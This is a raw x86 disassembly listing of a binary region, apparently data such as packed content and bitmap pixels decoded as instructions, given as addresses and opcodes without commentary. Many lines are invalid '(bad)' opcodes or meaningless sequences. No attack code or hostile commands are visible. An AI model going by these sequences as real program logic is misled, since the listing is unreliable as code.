  412304:	xchg   DWORD PTR [ecx+0x65cb1999],ebx
  41230a:	shl    BYTE PTR [ebp-0x3],1
  41230d:	arpl   WORD PTR [edi+0x5573f5cb],dx
  412313:	push   ebp
  412314:	dec    edi
  412315:	add    ebx,DWORD PTR [eax]
  412317:	cli    
  412318:	ror    DWORD PTR [edi-0x436c6b82],1
  41231e:	push   edx
  41231f:	add    eax,0x6513210d
  412324:	test   BYTE PTR [esi+0x155d6c29],cl
  41232a:	mov    cs,WORD PTR [ebx+0x6e89e7]
  412330:	pop    edi
  412331:	xchg   edi,eax
  412332:	imul   edi,edx,0x4f82e6b
  412338:	xchg   DWORD PTR [eax],eax
  41233a:	ds addr16 cwde 
  41233d:	sahf   
  41233e:	sahf   
  41233f:	jbe    0x412360
  412341:	cmp    dh,BYTE PTR [eax+ebp*2+0x57]
  412345:	cmp    al,0x1e
  412347:	(bad)  
  412348:	fistp  DWORD PTR [eax+0x2c]
  41234b:	imul   BYTE PTR ds:0x9dc35555
  412351:	popf   
  412352:	popf   
  412353:	out    dx,al
  412354:	sbb    ebp,DWORD PTR [edi-0x44]
  412357:	push   ecx
  412358:	fnstenv [ecx+0x6e360763]
  41235e:	fmul   QWORD PTR [eax-0x2be94790]
  412364:	cs xchg ebp,eax
  412366:	dec    edx
  412367:	shl    BYTE PTR [ecx*1-0x6531a347],1
  41236e:	mov    bp,WORD PTR [esp+eax*1]
  412372:	cmp    esi,DWORD PTR [edx]
  412374:	add    BYTE PTR [esi-0x48a0c1f6],dl
  41237a:	mov    bl,0x2
  41237c:	mov    eax,0x3f0a2fd9
  412381:	sub    eax,0x54e2c024
  412386:	pop    edi
  412387:	jl     0x412321
  412389:	lock jb 0x412345
  41238c:	fdiv   QWORD PTR [edx+ecx*4]
  41238f:	adc    BYTE PTR [ebp+0x22],cl
  412392:	sbb    cl,BYTE PTR [esi+eax*1]
  412395:	push   ecx
  412396:	lods   eax,DWORD PTR ds:[esi]
  412397:	push   esi
  412398:	push   ecx
  412399:	sub    al,0x16
  41239b:	xor    DWORD PTR ds:0x974b8d3d,edi
  4123a1:	cs pop ecx
  4123a3:	icebp  
  4123a4:	adc    BYTE PTR [eax],al
  4123a6:	and    eax,0xa6f5cb97
  4123ab:	stos   BYTE PTR es:[edi],al
  4123ac:	stos   BYTE PTR es:[edi],al
  4123ad:	mov    edi,0xb5f55551
  4123b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123b3:	sahf   
  4123b4:	jp     0x4123e0
  4123b6:	mov    ebx,0x8adad7c2
  4123bb:	adc    BYTE PTR [ebx+edi*8-0x26],ah
  4123bf:	ins    DWORD PTR es:[edi],dx
  4123c0:	scas   eax,DWORD PTR es:[edi]
  4123c1:	and    al,0x9a
  4123c3:	jg     0x41239a
  4123c5:	test   DWORD PTR [esi-0x307fde3d],ebx
  4123cb:	xor    DWORD PTR [esi-0xa4dc6e4],ecx
  4123d1:	shl    BYTE PTR [ebp+0x1b1cdf4b],cl
  4123d7:	sbb    edi,DWORD PTR [ebx+0x38]
  4123da:	popf   
  4123db:	dec    esi
  4123dc:	out    dx,eax
  4123dd:	jb     0x41239a
  4123df:	fisttp QWORD PTR [edx+0x28]
  4123e2:	adc    al,0x52
  4123e4:	ss ins DWORD PTR es:[edi],dx
  4123e6:	fiadd  DWORD PTR [ebx+ebx*2+0x1b05b96e]
  4123ed:	ss ins BYTE PTR es:[edi],dx
  4123ef:	inc    eax
  4123f0:	outs   dx,DWORD PTR ds:[esi]
  4123f1:	outs   dx,DWORD PTR ds:[esi]
  4123f2:	scas   eax,DWORD PTR es:[edi]
  4123f3:	and    eax,0xa0efd4e4
  4123f8:	push   eax
  4123f9:	sub    BYTE PTR [eax+0x79],bl
  4123fc:	div    DWORD PTR [edx-0x12f78c67]
  412402:	mov    ah,0x3e
  412404:	aaa    
  412405:	sti    
  412406:	gs sti 
  412408:	(bad)
  41240b:	fucomip st,st(7)
  41240d:	mov    bh,0x86
  41240f:	icebp  
  412410:	push   ss
  412411:	pop    ebx
  412412:	or     dl,BYTE PTR [eax*2-0xcf7794f]
  412419:	js     0x412457
  41241b:	lock sti 
  41241d:	std    
  41241e:	(bad)  
  41241f:	cwde   
  412420:	add    BYTE PTR [ecx+0x53530e5c],bh
  412426:	push   ebx
  412427:	mov    BYTE PTR [esi-0x5d],al
  41242a:	dec    eax
  41242b:	and    al,0x12
  41242d:	enter  0x72e5,0x34
  412431:	or     edx,ecx
  412433:	inc    esp
  412434:	pop    ebp
  412435:	lock jg 0x412429
  412438:	int3   
  412439:	xor    ecx,edi
  41243b:	pushf  
  41243c:	mov    edx,0x95b8af06
  412441:	mov    ebx,0x397b6ad0
  412446:	sar    esp,1
  412448:	jbe    0x412411
  41244a:	scas   al,BYTE PTR es:[edi]
  41244b:	or     bl,BYTE PTR [edx+eax*1]
  41244e:	clc    
  41244f:	or     eax,DWORD PTR [eax+0x22]
  412452:	xchg   ecx,eax
  412453:	lock jl 0x41244e
  412456:	loope  0x4123df
  412458:	mov    ebx,0xbde8d1a3
  41245d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41245e:	push   edx
  41245f:	imul   edx,ebx,0x26cccccc
  412465:	dec    ebp
  412466:	shl    DWORD PTR [esi-0x4e265966],cl
  41246c:	jp     0x412463
  41246e:	push   0x6c
  412470:	fnstsw WORD PTR [edx-0x20202eb]
  412476:	mov    BYTE PTR [edx+eiz*1-0x78],al
  41247a:	inc    esp
  41247b:	and    cl,BYTE PTR [eax]
  41247d:	xchg   ebx,eax
  41247f:	dec    ebp
  412480:	ret    
  412481:	outs   dx,DWORD PTR ds:[esi]
  412482:	sar    DWORD PTR [eax],cl
  412484:	jns    0x412502
  412486:	jmp    0x7cdc:0x24c8d22d
  41248d:	jbe    0x4124ac
  41248f:	push   ds
  412490:	movups xmm4,XMMWORD PTR [ebx+0x3]
  412494:	inc    eax
  412495:	mov    ds:0x3dcc5edd,eax
  41249a:	mov    al,ds:0x9a00f7be
  41249f:	inc    esi
  4124a0:	jecxz  0x412443
  4124a2:	jmp    0x4124bb
  4124a4:	or     al,BYTE PTR ds:0xe479f3e4
  4124aa:	jb     0x4124e5
  4124ac:	in     al,0x72
  4124ae:	cmp    DWORD PTR [esp+ebp*1],ebp
  4124b1:	sub    al,0x20
  4124b3:	xchg   ecx,eax
  4124b4:	dec    eax
  4124b5:	and    BYTE PTR [ebp+0x2850a34e],bl
  4124bb:	add    DWORD PTR fs:[ecx+edi*4+0x5c],ecx
  4124c0:	scas   al,BYTE PTR es:[edi]
  4124c1:	sub    DWORD PTR [ebp+0x55],edx
  4124c4:	inc    edi
  4124c5:	push   ebp
  4124c6:	push   ebp
  4124c7:	cmp    eax,0x7ddde000
  4124cc:	sti    
  4124cd:	imul   BYTE PTR [ebp+0x14afdb54]
  4124d3:	push   edi
  4124d4:	pop    ebx
  4124d5:	xchg   BYTE PTR [esi+0x3873d0b9],ch
  4124db:	add    al,0xf0
  4124dd:	pop    ss
  4124de:	mov    BYTE PTR [esi+esi*1-0x15],ch
  4124e2:	fwait
  4124e3:	cwde   
  4124e4:	cwde   
  4124e5:	pop    eax
  4124e6:	xor    esi,DWORD PTR ds:0x34677535
  4124ec:	sbb    bl,ch
  4124ee:	jne    0x4124d1
  4124f0:	ret    0xfb85
  4124f3:	or     eax,DWORD PTR [ebp+0x10016c2]
  4124f9:	mov    edi,0xdfbf0fdf
  4124fe:	imul   edx,edi
  412501:	mov    ebx,DWORD PTR [esi+0x5bac1e9e]
  412507:	mov    bh,0xe
  412509:	mov    ebp,0xeee8bdbd
  41250e:	out    dx,al
  41250f:	inc    esi
  412510:	push   edi
  412511:	push   edi
  412512:	pop    ss
  412513:	jp     0x412590
  412515:	jnp    0x412544
  412517:	sub    eax,0xcef3aadc
  41251c:	jb     0x41255e
  41251e:	or     BYTE PTR [ebp-0x5c],0xa2
  412522:	jmp    0x4124de
  412524:	adc    eax,0xb366c89f
  412529:	dec    eax
  41252a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41252b:	push   edx
  41252c:	xchg   esi,eax
  41252d:	and    BYTE PTR [edi+0x32],0x19
  412531:	stos   DWORD PTR es:[edi],eax
  412532:	inc    edi
  412533:	pop    edi
  412534:	popf   
  412535:	ins    BYTE PTR es:[edi],dx
  412536:	je     0x412538
  412538:	out    0x5c,eax
  41253a:	xlat   BYTE PTR cs:[ebx]
  41253c:	or     DWORD PTR [ebp+0x55],edx
  41253f:	dec    edi
  412540:	mov    eax,0x8a83ae5c
  412545:	mov    ds:0xdcf73ccc,al
  41254a:	jae    0x41253e
  41254c:	cmp    al,0xe1
  41254e:	dec    edi
  41254f:	paddusb mm3,QWORD PTR [ebp-0x60]
  412553:	ins    DWORD PTR es:[edi],dx
  412554:	sbb    DWORD PTR [esi],edi
  412556:	push   ebp
  412557:	inc    ecx
  412558:	mov    bh,0x83
  41255a:	inc    ebx
  41255b:	add    BYTE PTR [esi],cl
  41255d:	nop
  41255e:	dec    eax
  41255f:	and    al,0xfc
  412561:	inc    ebx
  412562:	inc    ebx
  412563:	inc    ebx
  412564:	sbb    esi,DWORD PTR [ebp+ebx*2-0x41]
  412568:	and    eax,0x3cde8d1a
  41256d:	ss test BYTE PTR ss:0x32653700,0x99
  412576:	sahf   
  412577:	bound  esi,QWORD PTR [ecx+0x5145418]
  41257d:	add    DWORD PTR [eax-0x40],0x4d4b5aea
  412584:	push   0x5d
  412586:	pop    ebp
  412587:	pop    ebp
  412588:	(bad)  
  412589:	inc    BYTE PTR [eax+0x20]
  41258c:	add    BYTE PTR [eax+0x20],0x60
  412590:	dec    ebp
  412591:	cmp    ch,BYTE PTR [edx-0x3c172d8]
  412597:	xchg   BYTE PTR [ecx+0x40],ah
  41259a:	shl    DWORD PTR [ebx+ecx*8],cl
  41259d:	adc    ch,BYTE PTR [eax]
  41259f:	push   ss
  4125a0:	mov    edx,DWORD PTR [esi+0x42]
  4125a3:	mov    fs,WORD PTR [esi+0xd34d069]
  4125a9:	stc    
  4125aa:	jl     0x4125ca
  4125ac:	test   DWORD PTR [edx-0x3f],eax
  4125af:	sbb    ah,dl
  4125b1:	fwait
  4125b2:	lods   al,BYTE PTR ds:[esi]
  4125b3:	or     eax,DWORD PTR [eax]
  4125b5:	jo     0x412570
  4125b7:	pop    esp
  4125b8:	mov    edx,0xaa8baaaa
  4125bd:	stos   BYTE PTR es:[edi],al
  4125be:	jle    0x412568
  4125c0:	stos   BYTE PTR es:[edi],al
  4125c1:	jmp    0x3d55:0x54170019
  4125c8:	test   eax,0xf3f0ca28
  4125cd:	iret   
  4125ce:	aas    
  4125cf:	jg     0x412586
  4125d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125d2:	xchg   esi,eax
  4125d3:	sti    
  4125d4:	mov    eax,DWORD PTR [edx-0x69f1ffbd]
  4125da:	and    BYTE PTR [ebp-0x3cf346b6],dl
  4125e0:	or     BYTE PTR [ebp+0x75667339],bl
  4125e6:	test   eax,0x30d5ba54
  4125eb:	mov    ebp,cs
  4125ed:	addr16 iret 
  4125ef:	sahf   
  4125f0:	pop    ebp
  4125f1:	xchg   ebx,eax
  4125f2:	int    0x66
  4125f4:	aaa    
  4125f5:	cdq    
  4125f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125f7:	mov    ecx,0x3ecd34d9
  4125fc:	pop    ebp
  4125fd:	xlat   BYTE PTR ds:[ebx]
  4125fe:	jge    0x4125c5
  412600:	(bad)
  412605:	aad    0x6a
  412607:	mov    ch,0xea
  412609:	xor    cl,BYTE PTR [ebx+eax*2]
  41260c:	push   ebp
  41260d:	push   ebp
  41260e:	push   ebp
  41260f:	and    eax,0xdd75d721
  412614:	dec    edx
  412615:	inc    esi
  412616:	push   edx
  412617:	adc    al,0xc5
  412619:	retf   0xa7f3
  41261c:	pusha  
  41261d:	bound  edi,QWORD PTR [ecx+0x29ea365c]
  412623:	mov    edx,0x1528a286
  412628:	push   ebp
  412629:	push   ebp
  41262a:	dec    ebp
  41262b:	push   ebp
  41262c:	push   ebp
  41262d:	sub    ebp,DWORD PTR [edx+0x5554c6aa]
  412633:	lea    eax,[edx]
  412635:	mov    BYTE PTR [ebx+0x28ae3aaa],ch
  41263b:	retf   0x4505
  41263e:	push   ecx
  41263f:	add    DWORD PTR cs:[eax],ebx
  412642:	jnp    0x412625
  412644:	test   DWORD PTR [edi],edx
  412646:	cs (bad) 
  412648:	jmp    0x1428f12b
  41264d:	push   cs
  41264e:	add    DWORD PTR [eax],edi
  412650:	pop    eax
  412651:	ss push edx
  412653:	test   eax,0x43a00294
  412658:	push   ebp
  412659:	push   ebp
  41265a:	dec    edi
  41265b:	es xchg ebx,eax
  41265d:	icebp  
  41265e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41265f:	shr    ecx,cl
  412661:	cs inc ebp
  412663:	push   ecx
  412664:	jl     0x41260e
  412666:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412667:	retf   
  412668:	jp     0x4126b6
  41266a:	ror    DWORD PTR [ecx+eax*1],cl
  41266d:	push   eax
  41266e:	push   esp
  41266f:	push   ebp
  412670:	lods   eax,DWORD PTR ds:[esi]
  412671:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412672:	shr    DWORD PTR [ecx+0x77],cl
  412675:	sub    dl,BYTE PTR [ebp-0x5d75d7f6]
  41267b:	mov    eax,0xbaf32e5c
  412680:	jmp    0x412630
  412682:	retf   
  412683:	test   eax,0x55aaa
  412688:	xchg   edi,eax
  412689:	retf   
  41268a:	push   ebp
  41268b:	cmp    DWORD PTR [edx-0xc],edi
  41268e:	test   al,0x76
  412690:	loop   0x412656
  412692:	mov    DWORD PTR [edx+0x28],ebp
  412695:	adc    al,0xca
  412697:	mov    ebx,0xa29cae5c
  41269c:	sub    BYTE PTR ds:0x51457900,al
  4126a2:	or     bh,BYTE PTR [edi]
  4126a4:	stc    
  4126a5:	leave  
  4126a6:	dec    edi
  4126a7:	(bad)  
  4126a8:	aam    0x66
  4126aa:	mov    esp,0x1c0e0703
  4126af:	cmp    BYTE PTR [eax-0x20],dh
  4126b2:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126b9:	jo     0x41269b
  4126bb:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126c2:	jo     0x4126a4
  4126c4:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126cb:	jo     0x4126ad
  4126cd:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126d4:	jo     0x4126b6
  4126d6:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126dd:	jo     0x4126bf
  4126df:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126e6:	jo     0x4126c8
  4126e8:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126ef:	jo     0x4126d1
  4126f1:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  4126f8:	jo     0x4126da
  4126fa:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  412701:	jo     0x4126e3
  412703:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  41270a:	jo     0x4126ec
  41270c:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  412713:	jo     0x4126f5
  412715:	rol    BYTE PTR [ecx+0x1c0e0703],0x38
  41271c:	jo     0x4126fe
  41271e:	rol    cl,0x15
  412721:	loopne 0x412722
  412723:	add    eax,DWORD PTR [esi]
  412725:	shl    eax,0x29
  412728:	xor    ecx,DWORD PTR [ebx+0x68]
  41272b:	inc    BYTE PTR [eax]
  41272d:	add    BYTE PTR [eax],al
  41272f:	add    BYTE PTR [ecx+0x45],cl
  412732:	dec    esi
  412733:	inc    esp
  412734:	scas   al,BYTE PTR es:[edi]
  412735:	inc    edx
  412736:	pusha  
  412737:	sub    BYTE PTR [eax],0x0
  41273a:	add    BYTE PTR [eax],al
  41273c:	xor    BYTE PTR [eax],al
  41273e:	add    BYTE PTR [eax],al
  412740:	pusha  
  412741:	add    BYTE PTR [eax],al
  412743:	add    BYTE PTR [ecx],al
  412745:	add    BYTE PTR [eax],ah
  412747:	add    BYTE PTR [eax],al
  412749:	add    BYTE PTR [eax],al
  41274b:	add    BYTE PTR [eax+0x25],al
	...
  4129f5:	add    BYTE PTR [eax],al
  4129f7:	add    BYTE PTR [ecx-0x44fa4e4f],dh
  4129fd:	mov    ebx,0xb3b31cbb
  412a02:	mov    bl,0x55
  412a04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a07:	xor    BYTE PTR [ecx-0x4d704e4f],0xb2
  412a0e:	mov    dl,0x96
  412a10:	mov    ah,0xb4
  412a12:	mov    ah,0x99
  412a14:	stos   DWORD PTR es:[edi],eax
  412a15:	stos   DWORD PTR es:[edi],eax
  412a16:	stos   DWORD PTR es:[edi],eax
  412a17:	xchg   edi,eax
  412a18:	lea    ecx,[ebp-0x7d7d6d73]
  412a1e:	add    BYTE PTR [edx+0x5c797979],0x72
  412a25:	jb     0x412a99
  412a27:	and    eax,DWORD PTR [ecx+0x78181]
	...
  412aad:	add    BYTE PTR [eax],al
  412aaf:	add    BYTE PTR [ebp-0x57e57273],cl
  412ab5:	test   al,0xa8
  412ab7:	jne    0x412a75
  412ab9:	mov    esp,0xcdcdd1bc
  412abe:	int    0xff
  412ac0:	aad    0xd5
  412ac2:	aad    0xff
  412ac4:	(bad)  
  412ac6:	(bad)  
  412ac8:	in     eax,0xe5
  412aca:	in     eax,0xff
  412acc:	in     eax,0xe5
  412ace:	in     eax,0xff
  412ad0:	loope  0x412ab3
  412ad2:	loope  0x412ad3
  412ad4:	(bad)  
  412ad6:	fdiv   st(7),st
  412ad8:	fstp   st(5)
  412ada:	(bad)  
  412adc:	(bad)  
  412ade:	fdivp  st(7),st
  412ae0:	rcl    ebx,cl
  412ae2:	sar    edi,cl
  412ae4:	rol    al,0xc0
  412ae7:	jmp    DWORD PTR [ecx-0x731f5e5f]
  412aed:	mov    WORD PTR [edi+eax*4+0x22969696],cs
	...
  412b04:	add    BYTE PTR [eax],al
  412b06:	add    BYTE PTR [edx],al
  412b08:	add    BYTE PTR [eax],al
  412b0a:	add    BYTE PTR [edx],al
  412b0c:	add    BYTE PTR [eax],al
  412b0e:	add    BYTE PTR [ecx],al
	...
  412b6c:	(bad)  
  412b6d:	(bad)  
  412b6e:	(bad)  
  412b6f:	addr16 mov bh,0xb7
  412b72:	mov    bh,0xea
  412b74:	aam    0xd4
  412b76:	aam    0xff
  412b78:	xlat   BYTE PTR ds:[ebx]
  412b79:	xlat   BYTE PTR ds:[ebx]
  412b7a:	xlat   BYTE PTR ds:[ebx]
  412b7b:	(bad)  
  412b7c:	fcmovnu st,st(3)
  412b7e:	(bad)  
  412b80:	(bad)  
  412b82:	fdiv   st(7),st
  412b84:	fcmovnu st,st(3)
  412b86:	(bad)  
  412b88:	fcmovu st,st(2)
  412b8a:	(bad)  
  412b8c:	(bad)  
  412b8d:	(bad)  
  412b8e:	(bad)  
  412b8f:	call   ecx
  412b91:	rcl    ecx,1
  412b93:	dec    ecx
  412b95:	leave  
  412b96:	leave  
  412b97:	dec    esp
  412b99:	int3   
  412b9a:	int3   
  412b9b:	(bad)  
  412b9c:	(bad)  
  412b9e:	(bad)  
  412ba0:	(bad)  
  412ba2:	fcos   
  412ba4:	ret    0xc2c2
  412ba7:	(bad)  
  412ba8:	mov    edi,0xc9ffbfbf
  412bad:	leave  
  412bae:	leave  
  412baf:	jmp    FWORD PTR [ebp+0x63f9adad]
  412bb5:	arpl   WORD PTR [ebx-0x7a],sp
  412bb8:	xor    eax,0xf3535
  412bbd:	add    BYTE PTR [eax],al
  412bbf:	add    BYTE PTR [eax],al
  412bc1:	add    BYTE PTR [eax],al
  412bc3:	push   ss
  412bc4:	add    BYTE PTR [eax],al
  412bc6:	add    BYTE PTR [ecx],bl
  412bc8:	add    BYTE PTR [eax],al
  412bca:	add    BYTE PTR [edi],dl
  412bcc:	add    BYTE PTR [eax],al
  412bce:	add    BYTE PTR ds:0x4000000,cl
  412bd4:	add    BYTE PTR [eax],al
  412bd6:	add    BYTE PTR [edx],al
  412bd8:	add    BYTE PTR [eax],al
  412bda:	add    BYTE PTR [ecx],al
	...
  412c28:	mov    ds:0xcaa6a2a2,al
  412c2d:	retf   0xffca
  412c30:	rcl    al,1
  412c32:	sar    bh,1
  412c34:	retf   
  412c35:	retf   
  412c36:	retf   
  412c37:	dec    ebx
  412c39:	retf   
  412c3a:	retf   
  412c3b:	call   eax
  412c3d:	rcl    al,1
  412c3f:	call   edi
  412c41:	xlat   BYTE PTR ds:[ebx]
  412c42:	xlat   BYTE PTR ds:[ebx]
  412c43:	(bad)  
  412c44:	fcmovu st,st(2)
  412c46:	(bad)  
  412c48:	fcmovnu st,st(3)
  412c4a:	(bad)  
  412c4c:	fcmovu st,st(2)
  412c4e:	(bad)  
  412c50:	aam    0xd4
  412c52:	aam    0xff
  412c54:	retf   
  412c55:	retf   
  412c56:	retf   
  412c57:	call   edx
  412c59:	rcl    dl,cl
  412c5b:	jmp    esp
  412c5d:	in     al,0xe4
  412c5f:	dec    ebp
  412c61:	int    0xcd
  412c63:	push   DWORD PTR [edx-0x3b004d4e]
  412c69:	(bad)  
  412c6a:	(bad)  
  412c6b:	dec    eax
  412c6d:	enter  0xffc8,0xb9
  412c71:	mov    ecx,0xc4c4ffb9
  412c76:	(bad)  
  412c77:	(bad)  
  412c78:	jle    0x412cf8
  412c7a:	jle    0x412c44
  412c7c:	or     eax,0x3d0d0d
  412c81:	add    BYTE PTR [eax],al
  412c83:	xor    DWORD PTR [eax],eax
  412c85:	add    BYTE PTR [eax],al
  412c87:	cmp    eax,0x32000000
  412c8c:	add    BYTE PTR [eax],al
  412c8e:	add    BYTE PTR [edx],ah
  412c90:	add    BYTE PTR [eax],al
  412c92:	add    BYTE PTR [ebx],dl
  412c94:	add    BYTE PTR [eax],al
  412c96:	add    BYTE PTR [eax],cl
  412c98:	add    BYTE PTR [eax],al
  412c9a:	add    BYTE PTR [eax+eax*1],al
  412c9d:	add    BYTE PTR [eax],al
  412c9f:	add    DWORD PTR [eax],eax
	...
  412ce1:	add    BYTE PTR [eax],al
  412ce3:	add    BYTE PTR [ebp-0x3a7a6263],bl
  412ce9:	(bad)
  412cec:	(bad)  
  412ced:	(bad)  
  412cee:	(bad)  
  412cef:	inc    ecx
  412cf1:	rol    ecx,0xff
  412cf4:	mov    edi,0xccccffc7
  412cfa:	int3   
  412cfb:	call   eax
  412cfd:	rcl    al,1
  412cff:	call   edi
  412d01:	xlat   BYTE PTR ds:[ebx]
  412d02:	xlat   BYTE PTR ds:[ebx]
  412d03:	(bad)  
  412d04:	(bad)  
  412d06:	fdiv   st(7),st
  412d08:	fstp   st(5)
  412d0a:	(bad)  
  412d0c:	(bad)  
  412d0e:	fdiv   st(7),st
  412d10:	aam    0xd4
  412d12:	aam    0xff
  412d14:	enter  0xc8c8,0xff
  412d18:	rcl    ebx,cl
  412d1a:	sar    edi,cl
  412d1c:	(bad)  
  412d1e:	fdivp  st(7),st
  412d20:	rol    ecx,0xc1
  412d23:	inc    edx
  412d25:	ret    0xffc2
  412d28:	retf   0xcaca
  412d2b:	push   DWORD PTR [ebp-0x53004a4b]
  412d31:	lods   al,BYTE PTR ds:[esi]
  412d32:	lods   al,BYTE PTR ds:[esi]
  412d33:	jmp    FWORD PTR [esp+ebp*4-0x3d3d0054]
  412d3a:	ret    0x6eff
  412d3d:	outs   dx,BYTE PTR ds:[esi]
  412d3e:	outs   dx,BYTE PTR ds:[esi]
  412d3f:	enter  0x0,0x0
  412d43:	dec    eax
  412d44:	add    BYTE PTR [eax],al
  412d46:	add    BYTE PTR [ebx+0x0],cl
  412d49:	add    BYTE PTR [eax],al
  412d4b:	inc    eax
  412d4c:	add    BYTE PTR [eax],al
  412d4e:	add    BYTE PTR [edx],dh
  412d50:	add    BYTE PTR [eax],al
  412d52:	add    BYTE PTR [eax+eax*1],ah
  412d55:	add    BYTE PTR [eax],al
  412d57:	adc    eax,0xb000000
  412d5c:	add    BYTE PTR [eax],al
  412d5e:	add    BYTE PTR ds:0x0,al
	...
  412da4:	mov    dh,0xb6
  412da6:	mov    dh,0xee
  412da8:	mov    ebp,0xbdffbdbd
  412dad:	mov    ebp,0xc1c1ffbd
  412db2:	sar    edi,0xc4
  412db5:	(bad)  
  412db6:	(bad)  
  412db7:	dec    eax
  412db9:	enter  0xffc8,0xce
  412dbd:	into   
  412dbe:	into   
  412dbf:	call   ebp
  412dc1:	aad    0xd5
  412dc3:	(bad)  
  412dc4:	(bad)  
  412dc6:	fdiv   st(7),st
  412dc8:	fstp   st(5)
  412dca:	(bad)  
  412dcc:	fcmovu st,st(2)
  412dce:	(bad)  
  412dd0:	rcl    dl,cl
  412dd2:	sar    bh,cl
  412dd4:	mov    edi,0xcdcdffc7
  412dda:	int    0xff
  412ddc:	int    0xcd
  412dde:	int    0xff
  412de0:	rol    ecx,0xc1
  412de3:	inc    edx
  412de5:	ret    0xffc2
  412de8:	mov    ah,0xb4
  412dea:	mov    ah,0xff
  412dec:	scas   eax,DWORD PTR es:[edi]
  412ded:	scas   eax,DWORD PTR es:[edi]
  412dee:	scas   eax,DWORD PTR es:[edi]
  412def:	jmp    FWORD PTR [eax-0x66005758]
  412df5:	cdq    
  412df6:	cdq    
  412df7:	jmp    DWORD PTR [esi-0x6800595a]
  412dfd:	xchg   edi,eax
  412dfe:	xchg   edi,eax
  412dff:	in     al,dx
  412e00:	or     eax,0x5e0d0d
  412e05:	add    BYTE PTR [eax],al
  412e07:	inc    ecx
  412e08:	add    BYTE PTR [eax],al
  412e0a:	add    BYTE PTR [eax+eax*1+0x0],al
  412e0e:	add    BYTE PTR [esi],dh
  412e10:	add    BYTE PTR [eax],al
  412e12:	add    BYTE PTR [edi],ah
  412e14:	add    BYTE PTR [eax],al
  412e16:	add    BYTE PTR [eax+eax*1],bl
  412e19:	add    BYTE PTR [eax],al
  412e1b:	adc    al,BYTE PTR [eax]
  412e1d:	add    BYTE PTR [eax],al
  412e1f:	or     DWORD PTR [eax],eax
	...
  412e61:	add    BYTE PTR [eax],al
  412e63:	add    BYTE PTR [esi-0x4813494a],dh
  412e69:	mov    bh,0xb7
  412e6b:	(bad)  
  412e6c:	mov    edx,0xbdffbaba
  412e71:	mov    ebp,0xc0c0ffbd
  412e76:	sar    bh,0xc4
  412e79:	(bad)  
  412e7a:	(bad)  
  412e7b:	dec    ecx
  412e7d:	leave  
  412e7e:	leave  
  412e7f:	dec    edi
  412e81:	iret   
  412e82:	iret   
  412e83:	call   esi
  412e85:	(bad)  
  412e86:	(bad)  
  412e87:	call   edi
  412e89:	xlat   BYTE PTR ds:[ebx]
  412e8a:	xlat   BYTE PTR ds:[ebx]
  412e8b:	call   ebp
  412e8d:	aad    0xd5
  412e8f:	dec    ebp
  412e91:	int    0xcd
  412e93:	inc    esp
  412e95:	(bad)  
  412e96:	(bad)  
  412e97:	inc    ebp
  412e99:	(bad)
  412e9c:	rol    al,0xc0
  412e9f:	(bad)  
  412ea0:	mov    ebp,0xb6ffbdbd
  412ea5:	mov    dh,0xb6
  412ea7:	jmp    FWORD PTR [esi-0x5d005152]
  412ead:	mov    ds:0x9494ffa2,al
  412eb2:	xchg   esp,eax
  412eb3:	call   DWORD PTR [eax-0x5a006f70]
  412eb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ebb:	call   FWORD PTR [ebp+0x17ef9d9d]
  412ec1:	pop    ss
  412ec2:	pop    ss
  412ec3:	pop    eax
  412ec4:	add    BYTE PTR [eax],al
  412ec6:	add    BYTE PTR [edx],dh
  412ec8:	add    BYTE PTR [eax],al
  412eca:	add    BYTE PTR [ebx],bh
  412ecc:	add    BYTE PTR [eax],al
  412ece:	add    BYTE PTR [ecx],dh
  412ed0:	add    BYTE PTR [eax],al
  412ed2:	add    BYTE PTR [esi],ah
  412ed4:	add    BYTE PTR [eax],al
  412ed6:	add    BYTE PTR [eax+eax*1],bl
  412ed9:	add    BYTE PTR [eax],al
  412edb:	adc    al,BYTE PTR [eax]
  412edd:	add    BYTE PTR [eax],al
  412edf:	or     DWORD PTR [eax],eax
	...
  412f21:	add    BYTE PTR [eax],al
  412f23:	add    BYTE PTR [edx-0x44524d4e],dh
  412f29:	mov    ebx,0xb9b9ffbb
  412f2e:	mov    ecx,0xb9b9b9ff
  412f33:	(bad)  
  412f34:	mov    esi,0xc0ffbebe
  412f39:	rol    al,0xff
  412f3c:	(bad)  
  412f3d:	(bad)  
  412f3e:	(bad)  
  412f3f:	inc    edi
  412f41:	mov    edi,0xccccccff
  412f47:	dec    esi
  412f49:	into   
  412f4a:	into   
  412f4b:	dec    esp
  412f4d:	int3   
  412f4e:	int3   
  412f4f:	inc    edi
  412f51:	mov    edi,0xc3c3c3ff
  412f57:	inc    eax
  412f59:	rol    al,0xff
  412f5c:	mov    edx,0xb0ffbaba
  412f61:	mov    al,0xb0
  412f63:	jmp    DWORD PTR [ebx-0x6b005c5d]
  412f69:	xchg   esp,eax
  412f6a:	xchg   esp,eax
  412f6b:	dec    DWORD PTR [esi-0x6e007172]
  412f71:	xchg   ecx,eax
  412f72:	xchg   ecx,eax
  412f73:	call   DWORD PTR [edi-0x50006869]
  412f79:	scas   eax,DWORD PTR es:[edi]
  412f7a:	scas   eax,DWORD PTR es:[edi]
  412f7b:	push   DWORD PTR [esp+esi*2+0x74]
